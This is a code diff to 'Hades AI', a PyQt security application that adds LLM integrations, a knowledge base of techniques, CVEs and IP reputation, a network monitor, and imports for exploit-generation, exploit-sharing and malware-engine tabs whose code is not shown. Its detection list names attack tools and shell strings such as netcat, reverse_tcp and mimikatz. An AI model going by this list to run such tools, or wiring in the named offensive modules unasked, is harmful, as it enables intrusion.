@@ -7,13 +7,16 @@ With Interactive Chat, Web Learning, and Tool Execution
 
 import os
 import sys
+
+# Suppress Qt font warnings before importing PyQt
+os.environ['QT_LOGGING_RULES'] = '*.debug=false;qt.text.font.*=false'
 import json
 import hashlib
 import sqlite3
 import numpy as np
 from datetime import datetime
 from collections import defaultdict, Counter
-from typing import Dict, List, Any, Optional, Tuple
+from typing import Dict, List, Any, Optional, Tuple, Callable
 from dataclasses import dataclass, field
 from pathlib import Path
 import re
@@ -23,50 +26,202 @@ import time
 import csv
 import socket
 import urllib.parse
+import html
 import concurrent.futures
 import urllib3
 import ast
 import sys
 import traceback
 from io import StringIO
+import os
+import logging
+import importlib.util
+import pyfiglet
 from urllib.parse import urljoin
+from modules import personality_core_v2 as pcore
+
+# Autonomous Coding Agent Integration
+try:
+    from autonomouscoding import AutonomousCodingAgent
+    HAS_AUTONOMOUS_AGENT = True
+except ImportError:
+    AutonomousCodingAgent = None
+    HAS_AUTONOMOUS_AGENT = False
+
+# Fallback LLM for agent (works without external API)
+try:
+    from fallback_llm import FallbackLLM
+    HAS_FALLBACK_LLM = True
+except ImportError:
+    FallbackLLM = None
+    HAS_FALLBACK_LLM = False
+
+# Offline LLM orchestrator for no-API operation
+try:
+    from offline_llm import OfflineLLM
+    HAS_OFFLINE_LLM = True
+except ImportError:
+    OfflineLLM = None
+    HAS_OFFLINE_LLM = False
+
+# LLM Conversation Core - Multi-provider support
+try:
+    from llm_conversation_core import ConversationManager
+    HAS_LLM_CORE = True
+except ImportError:
+    ConversationManager = None
+    HAS_LLM_CORE = False
+
+# Cognitive Memory System
+try:
+    from modules.cognitive_memory import CognitiveLayer, Memory, MemoryStore
+    HAS_COGNITIVE_MEMORY = True
+except ImportError:
+    CognitiveLayer = None
+    HAS_COGNITIVE_MEMORY = False
+
+# Autonomous Defense Module
+try:
+    from modules.autonomous_defense import (
+        AutonomousDefenseEngine, DefenseLevel, DefenseAction, DefenseRule,
+        integrate_with_network_monitor
+    )
+    HAS_AUTONOMOUS_DEFENSE = True
+except ImportError:
+    AutonomousDefenseEngine = None
+    HAS_AUTONOMOUS_DEFENSE = False
+
+# Payload Generator GUI
+try:
+    from payload_generator_gui import PayloadGeneratorTab
+    HAS_PAYLOAD_GEN = True
+except ImportError:
+    PayloadGeneratorTab = None
+    HAS_PAYLOAD_GEN = False
+
+# Data Mapping GUI
+try:
+    from data_mapping_gui import DataMappingTab
+    HAS_DATA_MAPPING = True
+except ImportError:
+    DataMappingTab = None
+    HAS_DATA_MAPPING = False
+
+# Realistic Simulations
+try:
+    from realistic_simulations import create_realistic_simulations_tab
+    HAS_REALISTIC_SIMS = True
+except ImportError:
+    create_realistic_simulations_tab = None
+    HAS_REALISTIC_SIMS = False
+
+# Deployment & Testing Automation
+try:
+    from deployment_automation_gui import DeploymentAutomationTab
+    HAS_DEPLOYMENT_AUTOMATION = True
+except ImportError:
+    DeploymentAutomationTab = None
+    HAS_DEPLOYMENT_AUTOMATION = False
+
+# Python Script Editor
+try:
+    from python_script_editor import PythonScriptEditorTab
+    HAS_SCRIPT_EDITOR = True
+except ImportError:
+    PythonScriptEditorTab = None
+    HAS_SCRIPT_EDITOR = False
+
+# P2P Exploit Sharing & Seeking
+try:
+    from p2p_exploit_sharing import P2PExploitSharer, ExploitFinding
+    from exploit_seek_tab import create_exploit_seek_tab
+    HAS_EXPLOIT_SEEK = True
+except ImportError:
+    P2PExploitSharer = None
+    ExploitFinding = None
+    create_exploit_seek_tab = None
+    HAS_EXPLOIT_SEEK = False
+
+# Exploit Tome - Centralized Exploit Repository
+try:
+    from exploit_tome_gui import ExploitTomeTab
+    HAS_EXPLOIT_TOME = True
+except ImportError:
+    ExploitTomeTab = None
+    HAS_EXPLOIT_TOME = False
+
+# Exploit Generator Tab - AI Exploit Generation from File Analysis
+try:
+    from exploit_generator_tab import ExploitGeneratorTab
+    HAS_EXPLOIT_GEN = True
+except ImportError:
+    ExploitGeneratorTab = None
+    HAS_EXPLOIT_GEN = False
+
+# Current/Implement Folder Integration (defensive catalog only)
+try:
+    from modules.current_implementation_loader import get_integration as get_current_implementation_integration
+    HAS_IMPLEMENTATION_INTEGRATION = True
+except ImportError:
+    get_current_implementation_integration = None
+    HAS_IMPLEMENTATION_INTEGRATION = False
+
+# PHASE 1 INTEGRATION - Critical Systems
+try:
+    from modules.obsidian_core_integration import get_obsidian_core
+    from modules.ethical_control_integration import get_ethical_control
+    from modules.malware_engine_integration import get_malware_engine
+    from phase1_gui_tabs import ObsidianCoreTab, EthicalControlTab, MalwareEngineTab
+    HAS_PHASE1_INTEGRATION = True
+except ImportError as e:
+    logger.warning(f"Phase 1 Integration failed: {str(e)}")
+    HAS_PHASE1_INTEGRATION = False
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# OpenAI GPT Integration
+# OpenAI GPT Integration (v1.0+ API)
 try:
-    import openai
-    openai.api_key = os.getenv("OPENAI_API_KEY")
+    from openai import OpenAI
     HAS_OPENAI = True
 except ImportError:
-    openai = None
+    OpenAI = None
     HAS_OPENAI = False
 
+# Mistral AI Integration
 try:
-    QT_BACKEND = "PyQt6"
-    from PyQt6.QtWidgets import (
-        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-        QPushButton, QTextEdit, QLabel, QProgressBar, QTabWidget,
-        QTreeWidget, QTreeWidgetItem, QComboBox, QLineEdit, QPlainTextEdit,
-        QGroupBox, QFormLayout, QSpinBox, QCheckBox,
-        QSplitter, QStatusBar, QMenuBar, QMenu, QFileDialog,
-        QMessageBox, QListWidget, QListWidgetItem, QTableWidget,
-        QTableWidgetItem, QHeaderView, QScrollArea
-    )
-    from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
-    from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextCursor
-except Exception:
-    QT_BACKEND = "PySide6"
-    from PySide6.QtWidgets import (
-        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-        QPushButton, QTextEdit, QLabel, QProgressBar, QTabWidget,
-        QTreeWidget, QTreeWidgetItem, QComboBox, QLineEdit, QPlainTextEdit,
-        QGroupBox, QFormLayout, QSpinBox, QCheckBox,
-        QSplitter, QStatusBar, QMenuBar, QMenu, QFileDialog,
-        QMessageBox, QListWidget, QListWidgetItem, QTableWidget,
-        QTableWidgetItem, QHeaderView, QScrollArea
-    )
-    from PySide6.QtCore import Qt, QThread, Signal as pyqtSignal, QTimer
-    from PySide6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextCursor
+    from mistralai import Mistral
+    HAS_MISTRAL = True
+except ImportError:
+    Mistral = None
+    HAS_MISTRAL = False
+
+# Ollama Integration (Local LLM - Free, no API key needed)
+try:
+    import ollama as ollama_lib
+    HAS_OLLAMA = True
+except ImportError:
+    ollama_lib = None
+    HAS_OLLAMA = False
+
+# Azure OpenAI Integration (Microsoft's hosted OpenAI)
+try:
+    from openai import AzureOpenAI
+    HAS_AZURE_OPENAI = True
+except ImportError:
+    AzureOpenAI = None
+    HAS_AZURE_OPENAI = False
+
+from PyQt6.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+    QPushButton, QTextEdit, QLabel, QProgressBar, QTabWidget,
+    QTreeWidget, QTreeWidgetItem, QComboBox, QLineEdit, QPlainTextEdit,
+    QGroupBox, QFormLayout, QSpinBox, QCheckBox, QDoubleSpinBox,
+    QSplitter, QStatusBar, QMenuBar, QMenu, QFileDialog,
+    QMessageBox, QListWidget, QListWidgetItem, QTableWidget,
+    QTableWidgetItem, QHeaderView, QScrollArea
+)
+from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
+from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextCursor
 
 try:
     import requests
@@ -187,13 +342,75 @@ class PythonHighlighter(QSyntaxHighlighter):
 # ============================================================================
 # KNOWLEDGE BASE
 # ============================================================================
+# Banner
+print(pyfiglet.figlet_format("Hades AI"))
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("HadesAI")
+logger.info("Hades AI Core initialized...")
 
+MODULE_DIR = "modules"
+loaded_modules = {}
+
+def parse_command(command):
+    parts = command.strip().split(maxsplit=1)
+    return parts if len(parts) == 2 else (parts[0], None)
+
+def load_module(module_name):
+    module_path = os.path.join(MODULE_DIR, f"{module_name}.py")
+    if not os.path.isfile(module_path):
+        return f"Module '{module_name}' not found."
+
+    spec = importlib.util.spec_from_file_location(module_name, module_path)
+    module = importlib.util.module_from_spec(spec)
+    try:
+        spec.loader.exec_module(module)
+        loaded_modules[module_name] = module
+        return f"Module '{module_name}' loaded."
+    except Exception as e:
+        return f"Failed to load module '{module_name}': {str(e)}"
+
+def list_modules():
+    if not os.path.exists(MODULE_DIR):
+        os.makedirs(MODULE_DIR)
+    files = [f[:-3] for f in os.listdir(MODULE_DIR) if f.endswith(".py")]
+    return files if files else ["No modules found."]
+
+def execute_module(module_name):
+    module = loaded_modules.get(module_name)
+    if not module:
+        return f"Module '{module_name}' not loaded."
+    if hasattr(module, "main"):
+        return module.main()
+    return f"Module '{module_name}' does not have a 'main()' function."
+
+def handle_command(action, target):
+    if action == "scan":
+        return f"Scanning {target}..."
+    elif action == "purge":
+        return f"Purging {target}..."
+    elif action == "initiate":
+        return f"Initiating {target}..."
+    elif action == "terminate":
+        return f"Terminating {target}..."
+    elif action == "echo":
+        return f"Hades echoes: {target}"
+    elif action == "help":
+        return "Commands: scan, purge, initiate, terminate, echo, help, load <module>, list modules, execute <module>"
+    elif action == "list" and target == "modules":
+        return "\n".join(list_modules())
+    elif action == "load":
+        return load_module(target)
+    elif action == "execute":
+        return execute_module(target)
+    else:
+        return "Hades does not comprehend your command."
 class KnowledgeBase:
     def __init__(self, db_path: str = "hades_knowledge.db"):
         self.db_path = db_path
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
         self.lock = threading.Lock()
         self._init_db()
+        
     def _init_db(self):
         cursor = self.conn.cursor()
 
@@ -220,7 +437,289 @@ class KnowledgeBase:
             id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, content_type TEXT,
             patterns_found TEXT, exploits_found TEXT, learned_at TEXT)''')
 
+        # Legacy/general tracking tables expected by stats/reporting paths.
+        cursor.execute('''CREATE TABLE IF NOT EXISTS experiences (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            category TEXT,
+            content TEXT,
+            confidence REAL DEFAULT 0.5,
+            created_at TEXT)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS cache_entries (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            path TEXT,
+            browser TEXT,
+            entry_type TEXT,
+            metadata TEXT,
+            detected_at TEXT)''')
+        
+        # NEW: Techniques table for normalized security knowledge
+        cursor.execute('''CREATE TABLE IF NOT EXISTS techniques (
+            technique_id TEXT PRIMARY KEY,
+            name TEXT NOT NULL,
+            category TEXT NOT NULL,
+            description TEXT,
+            indicators TEXT,
+            mitigations TEXT,
+            detection_rules TEXT,
+            references_json TEXT,
+            confidence REAL DEFAULT 0.5,
+            occurrences INTEGER DEFAULT 1,
+            updated_at TEXT)''')
+        
+        # NEW: Attack events for behavioral learning
+        cursor.execute('''CREATE TABLE IF NOT EXISTS attack_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            event_type TEXT NOT NULL,
+            src_ip TEXT,
+            dst_port INTEGER,
+            severity TEXT,
+            evidence TEXT,
+            action_taken TEXT,
+            technique_id TEXT,
+            created_at TEXT,
+            FOREIGN KEY (technique_id) REFERENCES techniques(technique_id))''')
+        
+        # NEW: CVE database for vulnerability knowledge
+        cursor.execute('''CREATE TABLE IF NOT EXISTS cves (
+            cve_id TEXT PRIMARY KEY,
+            summary TEXT,
+            cwe_ids TEXT,
+            cvss REAL,
+            affected_products TEXT,
+            references_json TEXT,
+            mitigations TEXT,
+            published TEXT,
+            last_modified TEXT)''')
+        
+        # NEW: IP reputation tracking
+        cursor.execute('''CREATE TABLE IF NOT EXISTS ip_reputation (
+            ip_address TEXT PRIMARY KEY,
+            threat_score REAL DEFAULT 0.0,
+            attack_count INTEGER DEFAULT 0,
+            first_seen TEXT,
+            last_seen TEXT,
+            categories TEXT,
+            is_blocked INTEGER DEFAULT 0,
+            notes TEXT)''')
+
+        # NEW: Local amp thread learning sources
+        cursor.execute('''CREATE TABLE IF NOT EXISTS amp_thread_sources (
+            thread_id TEXT PRIMARY KEY,
+            source_path TEXT,
+            file_hash TEXT,
+            imported_at TEXT,
+            message_count INTEGER DEFAULT 0)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS amp_thread_messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            thread_id TEXT NOT NULL,
+            role TEXT,
+            message_text TEXT,
+            source_file TEXT,
+            message_index INTEGER,
+            imported_at TEXT,
+            FOREIGN KEY (thread_id) REFERENCES amp_thread_sources(thread_id) ON DELETE CASCADE)''')
+
+        cursor.execute('''CREATE INDEX IF NOT EXISTS idx_amp_thread_messages_thread_id
+            ON amp_thread_messages(thread_id)''')
+        cursor.execute('''CREATE INDEX IF NOT EXISTS idx_amp_thread_messages_role
+            ON amp_thread_messages(role)''')
+
         self.conn.commit()
+    
+    # ========== Technique Management ==========
+    def store_technique(self, technique_id: str, name: str, category: str, 
+                        description: str = "", indicators: List[str] = None,
+                        mitigations: List[str] = None, detection_rules: List[str] = None,
+                        references: List[str] = None, confidence: float = 0.5):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO techniques
+                (technique_id, name, category, description, indicators, mitigations, 
+                 detection_rules, references_json, confidence, occurrences, updated_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 
+                    COALESCE((SELECT occurrences + 1 FROM techniques WHERE technique_id = ?), 1), ?)''',
+                (technique_id, name, category, description,
+                 json.dumps(indicators or []), json.dumps(mitigations or []),
+                 json.dumps(detection_rules or []), json.dumps(references or []),
+                 confidence, technique_id, datetime.now().isoformat()))
+            self.conn.commit()
+    
+    def search_techniques(self, query: str, limit: int = 5) -> List[Dict]:
+        """Search techniques by keyword"""
+        cursor = self.conn.cursor()
+        query_pattern = f"%{query.lower()}%"
+        cursor.execute('''SELECT * FROM techniques 
+            WHERE LOWER(name) LIKE ? OR LOWER(category) LIKE ? OR LOWER(description) LIKE ?
+            ORDER BY occurrences DESC, confidence DESC LIMIT ?''',
+            (query_pattern, query_pattern, query_pattern, limit))
+        return [self._row_to_technique(r) for r in cursor.fetchall()]
+    
+    def get_technique_by_category(self, category: str, limit: int = 10) -> List[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('''SELECT * FROM techniques WHERE LOWER(category) = LOWER(?)
+            ORDER BY occurrences DESC LIMIT ?''', (category, limit))
+        return [self._row_to_technique(r) for r in cursor.fetchall()]
+    
+    def _row_to_technique(self, row) -> Dict:
+        return {
+            'technique_id': row[0], 'name': row[1], 'category': row[2],
+            'description': row[3], 'indicators': json.loads(row[4] or '[]'),
+            'mitigations': json.loads(row[5] or '[]'),
+            'detection_rules': json.loads(row[6] or '[]'),
+            'references': json.loads(row[7] or '[]'),
+            'confidence': row[8], 'occurrences': row[9], 'updated_at': row[10]
+        }
+    
+    # ========== Attack Event Logging ==========
+    def log_attack_event(self, event_type: str, src_ip: str, dst_port: int = 0,
+                         severity: str = "MEDIUM", evidence: Dict = None,
+                         action_taken: str = "", technique_id: str = None):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT INTO attack_events
+                (event_type, src_ip, dst_port, severity, evidence, action_taken, technique_id, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                (event_type, src_ip, dst_port, severity, json.dumps(evidence or {}),
+                 action_taken, technique_id, datetime.now().isoformat()))
+            self.conn.commit()
+            
+            # Update IP reputation
+            self._update_ip_reputation(src_ip, event_type, severity)
+    
+    def get_attack_events(self, limit: int = 100, src_ip: str = None) -> List[Dict]:
+        cursor = self.conn.cursor()
+        if src_ip:
+            cursor.execute('SELECT * FROM attack_events WHERE src_ip = ? ORDER BY created_at DESC LIMIT ?',
+                          (src_ip, limit))
+        else:
+            cursor.execute('SELECT * FROM attack_events ORDER BY created_at DESC LIMIT ?', (limit,))
+        return [{
+            'id': r[0], 'event_type': r[1], 'src_ip': r[2], 'dst_port': r[3],
+            'severity': r[4], 'evidence': json.loads(r[5] or '{}'),
+            'action_taken': r[6], 'technique_id': r[7], 'created_at': r[8]
+        } for r in cursor.fetchall()]
+    
+    # ========== IP Reputation ==========
+    def _update_ip_reputation(self, ip: str, event_type: str, severity: str):
+        severity_scores = {'LOW': 0.1, 'MEDIUM': 0.3, 'HIGH': 0.6, 'CRITICAL': 1.0}
+        score_delta = severity_scores.get(severity, 0.3)
+        
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT threat_score, attack_count, categories FROM ip_reputation WHERE ip_address = ?', (ip,))
+        row = cursor.fetchone()
+        
+        now = datetime.now().isoformat()
+        if row:
+            new_score = min(10.0, row[0] + score_delta)
+            categories = json.loads(row[2] or '[]')
+            if event_type not in categories:
+                categories.append(event_type)
+            cursor.execute('''UPDATE ip_reputation 
+                SET threat_score = ?, attack_count = attack_count + 1, 
+                    last_seen = ?, categories = ?
+                WHERE ip_address = ?''',
+                (new_score, now, json.dumps(categories), ip))
+        else:
+            cursor.execute('''INSERT INTO ip_reputation 
+                (ip_address, threat_score, attack_count, first_seen, last_seen, categories)
+                VALUES (?, ?, 1, ?, ?, ?)''',
+                (ip, score_delta, now, now, json.dumps([event_type])))
+        self.conn.commit()
+    
+    def get_ip_reputation(self, ip: str) -> Optional[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM ip_reputation WHERE ip_address = ?', (ip,))
+        row = cursor.fetchone()
+        if row:
+            return {
+                'ip': row[0], 'threat_score': row[1], 'attack_count': row[2],
+                'first_seen': row[3], 'last_seen': row[4],
+                'categories': json.loads(row[5] or '[]'),
+                'is_blocked': bool(row[6]), 'notes': row[7]
+            }
+        return None
+    
+    def get_malicious_ips(self, min_score: float = 3.0) -> List[str]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT ip_address FROM ip_reputation WHERE threat_score >= ?', (min_score,))
+        return [r[0] for r in cursor.fetchall()]
+    
+    def block_ip(self, ip: str, reason: str = ""):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO ip_reputation 
+                (ip_address, threat_score, attack_count, first_seen, last_seen, is_blocked, notes)
+                VALUES (?, 10.0, COALESCE((SELECT attack_count FROM ip_reputation WHERE ip_address = ?), 1),
+                    COALESCE((SELECT first_seen FROM ip_reputation WHERE ip_address = ?), ?), ?, 1, ?)''',
+                (ip, ip, ip, datetime.now().isoformat(), datetime.now().isoformat(), reason))
+            self.conn.commit()
+    
+    # ========== CVE Management ==========
+    def store_cve(self, cve_id: str, summary: str, cwe_ids: List[str] = None,
+                  cvss: float = 0.0, affected: List[str] = None,
+                  references: List[str] = None, mitigations: List[str] = None):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO cves
+                (cve_id, summary, cwe_ids, cvss, affected_products, references_json, mitigations, 
+                 published, last_modified)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                (cve_id, summary, json.dumps(cwe_ids or []), cvss,
+                 json.dumps(affected or []), json.dumps(references or []),
+                 json.dumps(mitigations or []), datetime.now().isoformat(), datetime.now().isoformat()))
+            self.conn.commit()
+    
+    def search_cves(self, query: str, limit: int = 10) -> List[Dict]:
+        cursor = self.conn.cursor()
+        if query.upper().startswith('CVE-'):
+            cursor.execute('SELECT * FROM cves WHERE cve_id = ?', (query.upper(),))
+        else:
+            cursor.execute('''SELECT * FROM cves WHERE LOWER(summary) LIKE ? 
+                OR LOWER(affected_products) LIKE ? ORDER BY cvss DESC LIMIT ?''',
+                (f'%{query.lower()}%', f'%{query.lower()}%', limit))
+        return [{
+            'cve_id': r[0], 'summary': r[1], 'cwe_ids': json.loads(r[2] or '[]'),
+            'cvss': r[3], 'affected': json.loads(r[4] or '[]'),
+            'references': json.loads(r[5] or '[]'), 'mitigations': json.loads(r[6] or '[]'),
+            'published': r[7], 'last_modified': r[8]
+        } for r in cursor.fetchall()]
+    
+    # ========== Intelligent Query ==========
+    def query_knowledge(self, query: str, context: str = "") -> Dict[str, Any]:
+        """Query all knowledge sources for relevant information"""
+        results = {
+            'techniques': self.search_techniques(query, 3),
+            'patterns': [],
+            'cves': self.search_cves(query, 3),
+            'exploits': [],
+            'ip_info': None
+        }
+        
+        # Check for IP address in query
+        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', query)
+        if ip_match:
+            results['ip_info'] = self.get_ip_reputation(ip_match.group())
+        
+        # Search patterns
+        cursor = self.conn.cursor()
+        cursor.execute('''SELECT * FROM security_patterns 
+            WHERE LOWER(pattern_type) LIKE ? OR LOWER(signature) LIKE ?
+            ORDER BY occurrences DESC LIMIT 3''',
+            (f'%{query.lower()}%', f'%{query.lower()}%'))
+        results['patterns'] = self.get_patterns()[:3]
+        
+        # Search exploits
+        cursor.execute('''SELECT * FROM learned_exploits
+            WHERE LOWER(exploit_type) LIKE ? OR LOWER(description) LIKE ?
+            ORDER BY success_count DESC LIMIT 3''',
+            (f'%{query.lower()}%', f'%{query.lower()}%'))
+        results['exploits'] = [{
+            'type': r[2], 'source': r[1], 'description': r[4]
+        } for r in cursor.fetchall()]
+        
+        return results
     def get_patterns(self) -> List[dict]:
         cursor = self.conn.cursor()
         cursor.execute('SELECT * FROM security_patterns')
@@ -304,6 +803,96 @@ class KnowledgeBase:
             VALUES (?,?,?,?,?)''',
             (url, content_type, json.dumps(patterns), json.dumps(exploits), datetime.now().isoformat()))
             self.conn.commit()
+
+    # ========== Amp Threads Learning ==========
+    def get_amp_thread_source_hash(self, thread_id: str) -> Optional[str]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT file_hash FROM amp_thread_sources WHERE thread_id = ?', (thread_id,))
+        row = cursor.fetchone()
+        return row[0] if row else None
+
+    def replace_amp_thread_messages(self, thread_id: str, source_path: str,
+                                    file_hash: str, messages: List[Dict[str, Any]]):
+        with self.lock:
+            cursor = self.conn.cursor()
+            imported_at = datetime.now().isoformat()
+
+            cursor.execute('''INSERT INTO amp_thread_sources
+                (thread_id, source_path, file_hash, imported_at, message_count)
+                VALUES (?, ?, ?, ?, ?)
+                ON CONFLICT(thread_id) DO UPDATE SET
+                    source_path=excluded.source_path,
+                    file_hash=excluded.file_hash,
+                    imported_at=excluded.imported_at,
+                    message_count=excluded.message_count''',
+                (thread_id, source_path, file_hash, imported_at, len(messages)))
+
+            cursor.execute('DELETE FROM amp_thread_messages WHERE thread_id = ?', (thread_id,))
+
+            if messages:
+                rows = []
+                for idx, msg in enumerate(messages):
+                    rows.append((
+                        thread_id,
+                        (msg.get('role') or 'unknown')[:32],
+                        msg.get('text', ''),
+                        source_path,
+                        int(msg.get('index', idx)),
+                        imported_at
+                    ))
+
+                cursor.executemany('''INSERT INTO amp_thread_messages
+                    (thread_id, role, message_text, source_file, message_index, imported_at)
+                    VALUES (?, ?, ?, ?, ?, ?)''', rows)
+
+            self.conn.commit()
+
+    def search_amp_thread_messages(self, query: str, limit: int = 8) -> List[Dict[str, Any]]:
+        cursor = self.conn.cursor()
+        cleaned_query = (query or '').strip().lower()
+        if not cleaned_query:
+            cursor.execute('''SELECT thread_id, role, message_text, source_file, message_index
+                FROM amp_thread_messages
+                ORDER BY imported_at DESC, id DESC LIMIT ?''', (limit,))
+        else:
+            tokens = re.findall(r'[a-z0-9_\-]{3,}', cleaned_query)[:6]
+            conditions = []
+            params: List[Any] = []
+
+            like_query = f"%{cleaned_query}%"
+            conditions.append('LOWER(message_text) LIKE ?')
+            params.append(like_query)
+
+            for token in tokens:
+                conditions.append('LOWER(message_text) LIKE ?')
+                params.append(f"%{token}%")
+
+            where_clause = ' OR '.join(conditions)
+            params.append(limit)
+
+            cursor.execute(f'''SELECT thread_id, role, message_text, source_file, message_index
+                FROM amp_thread_messages
+                WHERE {where_clause}
+                ORDER BY imported_at DESC, id DESC LIMIT ?''', params)
+
+        return [
+            {
+                'thread_id': row[0],
+                'role': row[1],
+                'text': row[2],
+                'source_file': row[3],
+                'message_index': row[4]
+            }
+            for row in cursor.fetchall()
+        ]
+
+    def get_amp_learning_stats(self) -> Dict[str, int]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT COUNT(*) FROM amp_thread_sources')
+        thread_count = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM amp_thread_messages')
+        message_count = cursor.fetchone()[0]
+        return {'thread_sources': thread_count, 'thread_messages': message_count}
 
 
     def fetch_recent_web_patterns(self, limit=1) -> List[str]:
@@ -513,6 +1102,7 @@ class NetworkMonitor(QThread):
     threat_detected = pyqtSignal(dict)
     status_update = pyqtSignal(str)
     stats_update = pyqtSignal(dict)
+    auto_response = pyqtSignal(dict)  # NEW: Signal for automatic responses
     
     THREAT_PORTS = {
         21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
@@ -522,11 +1112,37 @@ class NetworkMonitor(QThread):
         31337: 'BackOrifice', 12345: 'NetBus', 54321: 'BackOrifice2K',
     }
     
+    # Attack detection thresholds
+    SCAN_THRESHOLD_PORTS = 15  # Unique ports in time window = port scan
+    SCAN_THRESHOLD_TIME = 30  # Time window in seconds
+    BRUTE_FORCE_THRESHOLD = 10  # Connections to auth ports in time window
+    BRUTE_FORCE_TIME = 60  # Time window in seconds
+    
+    # Attack technique mappings
+    ATTACK_TECHNIQUES = {
+        'port_scan': {'id': 'T1046', 'name': 'Network Service Scanning', 'category': 'reconnaissance'},
+        'brute_force': {'id': 'T1110', 'name': 'Brute Force', 'category': 'credential_access'},
+        'c2_connection': {'id': 'T1071', 'name': 'Command and Control', 'category': 'command_control'},
+        'lateral_movement': {'id': 'T1021', 'name': 'Remote Services', 'category': 'lateral_movement'},
+        'exploitation': {'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'category': 'initial_access'},
+    }
+    
     MALICIOUS_IPS = set()
     SUSPICIOUS_PATTERNS = [
         'nmap', 'masscan', 'nikto', 'sqlmap', 'hydra', 'medusa',
-        'metasploit', 'cobalt', 'beacon', 'mimikatz', 'powershell -enc'
+        'metasploit', 'cobalt', 'beacon', 'mimikatz', 'powershell -enc',
+        'meterpreter', 'reverse_tcp', 'bind_shell', 'nc.exe', 'netcat'
     ]
+    
+    # Defense response levels
+    RESPONSE_LEVELS = {
+        'observe': 0,    # Log only
+        'warn': 1,       # Log + alert
+        'throttle': 2,   # Slow down / tarpit
+        'block_temp': 3, # Temporary block (TTL)
+        'block_perm': 4, # Permanent block + firewall
+        'counter': 5     # Active countermeasures
+    }
     
     def __init__(self, kb: 'KnowledgeBase' = None):
         super().__init__()
@@ -534,13 +1150,35 @@ class NetworkMonitor(QThread):
         self.running = False
         self.defense_mode = False
         self.learning_mode = True
+        self.auto_defend = True  # NEW: Automatic defense responses
+        self.response_level = 3  # Default: block_temp
         self.connection_history = []
         self.threat_log = []
         self.blocked_ips = set()
+        
+        # NEW: Behavioral tracking for each IP
+        self.ip_behavior = defaultdict(lambda: {
+            'ports_accessed': [],
+            'connection_times': [],
+            'failed_auths': 0,
+            'threat_score': 0.0,
+            'last_action': None,
+            'action_time': None
+        })
+        
+        # Load known malicious IPs from KB
+        if self.kb:
+            try:
+                self.MALICIOUS_IPS = set(self.kb.get_malicious_ips(3.0))
+            except:
+                pass
+        
         self.stats = {
             'total_connections': 0,
             'threats_detected': 0,
             'attacks_blocked': 0,
+            'scans_detected': 0,
+            'brute_force_detected': 0,
             'unique_ips': set(),
             'start_time': None
         }
@@ -605,6 +1243,7 @@ class NetworkMonitor(QThread):
         threat_level = 'SAFE'
         threat_type = None
         threat_details = []
+        attack_technique = None
         
         remote_port = conn.get('remote_port', 0)
         remote_ip = conn.get('remote_ip')
@@ -612,13 +1251,34 @@ class NetworkMonitor(QThread):
         process = conn.get('process', '')
         cmdline = conn.get('cmdline', '')
         
+        # Update behavioral tracking for this IP
+        if remote_ip:
+            self._update_ip_behavior(remote_ip, local_port, conn)
+            
+            # Check for behavioral patterns (port scan, brute force)
+            behavior_threat = self._detect_behavioral_attack(remote_ip)
+            if behavior_threat:
+                threat_level = behavior_threat['level']
+                threat_type = behavior_threat['type']
+                threat_details.extend(behavior_threat['details'])
+                attack_technique = behavior_threat.get('technique')
+        
+        # Check against known bad IPs
         if remote_ip in self.blocked_ips or remote_ip in self.MALICIOUS_IPS:
             threat_level = 'CRITICAL'
             threat_type = 'BLOCKED_IP'
             threat_details.append(f"Connection from blocked IP: {remote_ip}")
+        
+        # Check IP reputation from knowledge base
+        if remote_ip and self.kb:
+            ip_rep = self.kb.get_ip_reputation(remote_ip)
+            if ip_rep and ip_rep['threat_score'] >= 5.0:
+                threat_level = 'HIGH'
+                threat_type = threat_type or 'KNOWN_THREAT'
+                threat_details.append(f"Known threat: score={ip_rep['threat_score']:.1f}, attacks={ip_rep['attack_count']}")
             
         if remote_port in self.THREAT_PORTS:
-            if threat_level != 'CRITICAL':
+            if threat_level not in ['CRITICAL', 'HIGH']:
                 threat_level = 'WARNING'
             threat_type = threat_type or 'SUSPICIOUS_PORT'
             threat_details.append(f"Connection to sensitive port: {remote_port} ({self.THREAT_PORTS[remote_port]})")
@@ -634,16 +1294,19 @@ class NetworkMonitor(QThread):
                 threat_level = 'HIGH'
                 threat_type = 'SUSPICIOUS_PROCESS'
